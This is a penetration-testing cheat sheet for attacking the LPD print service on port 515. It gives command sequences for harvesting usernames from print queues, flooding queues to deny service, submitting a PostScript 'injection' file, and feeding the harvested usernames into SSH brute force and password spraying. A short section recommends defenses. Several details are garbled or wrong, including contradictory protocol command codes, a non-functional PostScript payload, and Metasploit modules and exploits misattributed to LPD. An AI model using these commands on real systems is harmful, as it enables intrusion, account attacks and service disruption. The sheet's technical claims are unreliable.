# LPD ENUMERATION (Port 515/TCP)

## SERVICE OVERVIEW
```
LPD (Line Printer Daemon) - Unix/Linux printing protocol
- Default port: 515/TCP
- RFC 1179 - Line Printer Daemon Protocol
- Used by CUPS, lpd, lprng on Unix/Linux
- Can reveal system information, user queues
- Potential for exploitation via print jobs
```

## BANNER GRABBING & VERSION DETECTION
```bash
nmap -sV -p515 <IP>                             # Service/Version detection
nc -nv <IP> 515                                 # Manual connection
telnet <IP> 515                                 # Alternative connection
```

## NMAP ENUMERATION
```bash
# LPD scripts
nmap -p515 --script lpd-info <IP>               # Get printer info
nmap -p515 --script lp-queue <IP>               # Enumerate print queues
nmap -p515 --script lpd-list <IP>               # List available printers

# Version detection
nmap -sV -p515 <IP>
```

## ENUMERATE PRINTERS
```bash
# List printers/queues
echo -e "\x02lpstat -p\n" | nc -nv <IP> 515

# Query queue status
echo -e "\x03<queue_name>\n" | nc -nv <IP> 515

# Display short queue status
echo -e "\x04<queue_name>\n" | nc -nv <IP> 515

# lpinfo (if available)
lpinfo -v --include-schemes lpd                 # List LPD printers
```

## LPD PROTOCOL COMMANDS
```
Command codes (first byte):
0x01 - Print job
0x02 - Receive control file
0x03 - Send queue state (short)
0x04 - Send queue state (long)
0x05 - Remove jobs
0x06 - Receive data file

Format: <command><queue_name><optional_args>\n
```

## MANUAL LPD INTERACTION
```bash
# Query queue (short format)
printf "\x04lpq\n" | nc -nv <IP> 515

# Query queue (long format)
printf "\x03lp\n" | nc -nv <IP> 515

# List all queues
for queue in lp lp0 lp1 printer print; do
    echo "Testing queue: $queue"
    printf "\x04$queue\n" | nc -nv <IP> 515
done
```

## PRINT JOB SUBMISSION
```bash
# Send test print job
cat > test_job.txt <<EOF
Hello, this is a test print job
EOF

# Submit job via lpr (if LPD server accessible)
lpr -P <queue>@<IP> test_job.txt

# Manual job submission (complex, use lpr instead)
# Requires proper LPD protocol formatting
```

## ENUMERATE USERS FROM QUEUE
```bash
# Print queue often reveals usernames
printf "\x04lp\n" | nc -nv <IP> 515 | grep -oE "^[a-zA-Z0-9_-]+" | sort -u

# Long queue status shows more details
printf "\x03lp\n" | nc -nv <IP> 515
```

## METASPLOIT MODULES
```bash
msfconsole
use auxiliary/scanner/printer/printer_list_dir # List printer directories
use auxiliary/scanner/printer/printer_env_vars # Dump environment variables
use auxiliary/scanner/printer/printer_version_info  # Version info

set RHOSTS <IP>
set RPORT 515
run

# Exploit modules (if vulnerable)
use exploit/unix/misc/distcc_exec              # Not LPD but related
search lpd
```

## COMMON PRINTER QUEUE NAMES
```bash
# Common queue names to test
lp, lp0, lp1, lp2
print, printer, printers
raw, ps, text
hp, laser, canon, epson
pdf, scan
```

## FILE READ/WRITE EXPLOITATION
```bash
# Some LPD implementations vulnerable to file operations

# Attempt to read files (path traversal)
# This is highly dependent on implementation

# Example: Try to access /etc/passwd via print job
# (Most modern LPD implementations prevent this)

# Metasploit file read
use auxiliary/scanner/printer/printer_list_dir
set RHOSTS <IP>
set RPORT 515
set DIRECTORY /etc/
run
```

## CUPS (COMMON UNIX PRINTING SYSTEM)
```bash
# CUPS uses IPP (port 631) primarily, but also supports LPD

# If CUPS is detected on 515:
nmap -p631 --script ipp-info <IP>              # Check IPP (CUPS)
curl http://<IP>:631/printers/                 # Web interface

# CUPS version detection
nc -nv <IP> 631
GET /printers/ HTTP/1.1
Host: <IP>
```

## VULNERABILITY SCANNING
```bash
# Search for LPD exploits
searchsploit lpd                                # Search all LPD exploits
searchsploit lprng                              # LPRng exploits

# Known vulnerabilities:
# CVE-2000-1220: Remote command execution in lpd
# CVE-2001-1583: Buffer overflow in lpd
# CVE-2011-2697: CUPS lpd backend file descriptor leak
```

## REMOTE CODE EXECUTION (HISTORICAL)
```bash
# Older LPD implementations had RCE vulns
# Example: IRIX lpd overflow (CVE-2000-1220)

# Metasploit (if applicable)
search lpd
use exploit/unix/misc/lpd_*
set RHOSTS <IP>
exploit
```

## INFORMATION GATHERING
```bash
# Information LPD can reveal:
# - Operating system (via nmap -sV)
# - Printer models/types
# - Usernames (from print queue)
# - Hostnames
# - Internal network structure
# - File system paths (sometimes)
# - Software versions (CUPS, lprng, etc.)

# Extract all usernames from queue
printf "\x04lp\n" | nc -nv <IP> 515 > lpd_queue.txt
grep -oE "^[a-zA-Z0-9_-]+" lpd_queue.txt | sort -u > users.txt
```

## DENIAL OF SERVICE
```bash
# Flood print queue with jobs
while true; do
    echo "DoS test" | lpr -P lp@<IP>
done

# Note: Use responsibly, only in authorized testing
```

## COMMON MISCONFIGURATIONS
```
☐ LPD accessible from external networks
☐ No authentication required for print jobs
☐ Print queues revealing usernames
☐ Weak file permissions on spool directory
☐ Path traversal vulnerabilities
☐ Outdated LPD implementation with known exploits
☐ Verbose error messages leaking info
☐ No rate limiting (DoS possible)
```

## QUICK WIN CHECKLIST
```
☐ Check if LPD is accessible (port 515 open)
☐ Enumerate printer queues
☐ Query queue status for usernames
☐ Test common queue names (lp, printer, etc.)
☐ Check CUPS web interface if applicable (port 631)
☐ Attempt to submit test print job
☐ Search for LPD version-specific exploits
☐ Check for file read/write capabilities
☐ Extract usernames for further attacks (SSH, SMB)
```

## ONE-LINER ENUMERATION
```bash
# Quick LPD enumeration
nmap -sV -p515 --script "lpd-*" <IP>

# Test common queues
for q in lp lp0 printer print; do printf "\x04$q\n" | nc -nv <IP> 515; done
```

## TOOLS
```bash
# Nmap
nmap -p515 --script lpd-* <IP>

# Netcat
nc -nv <IP> 515

# lpr (submit jobs)
lpr -P printer@<IP> file.txt

# lpq (query queue)
lpq -P printer@<IP>

# Metasploit
use auxiliary/scanner/printer/*
```

## SECURITY IMPLICATIONS
```
RISKS:
- Username enumeration (reconnaissance)
- Information disclosure (system paths, versions)
- Remote code execution (in old implementations)
- DoS via queue flooding
- Unauthorized printing (waste resources)
- Potential file system access (path traversal)

RECOMMENDATIONS:
- Disable LPD if not needed
- Use IPP (CUPS) instead with authentication
- Restrict access to trusted networks only
- Implement firewall rules for port 515
- Keep printing software up to date
- Monitor print queue for suspicious jobs
- Disable unnecessary queues
- Use authentication for print jobs (if supported)
```

## ADVANCED TECHNIQUES
```bash
# PostScript injection
# If printer accepts PostScript, you can inject commands
cat > malicious.ps <<'EOF'
%!PS
/str 100 string def
(whoami) (r) file
{str readline} loop
EOF

lpr -P lp@<IP> malicious.ps

# Note: Modern printers sandbox PostScript execution

# Combine with other services
# 1. Enumerate users via LPD
printf "\x04lp\n" | nc <IP> 515 | grep -oE "^[a-zA-Z0-9_-]+" > users.txt

# 2. Use for SSH brute force
hydra -L users.txt -P passwords.txt ssh://<IP>
```

## INTEGRATION WITH OTHER ATTACKS
```bash
# Chain LPD enumeration with other services
# 1. Get users from LPD
printf "\x04lp\n" | nc <IP> 515 > lpd_users.txt

# 2. Test users on SSH
for user in $(cat lpd_users.txt); do
    ssh $user@<IP>
done

# 3. Use with password spraying
crackmapexec ssh <IP> -u lpd_users.txt -p 'Password123!'
```
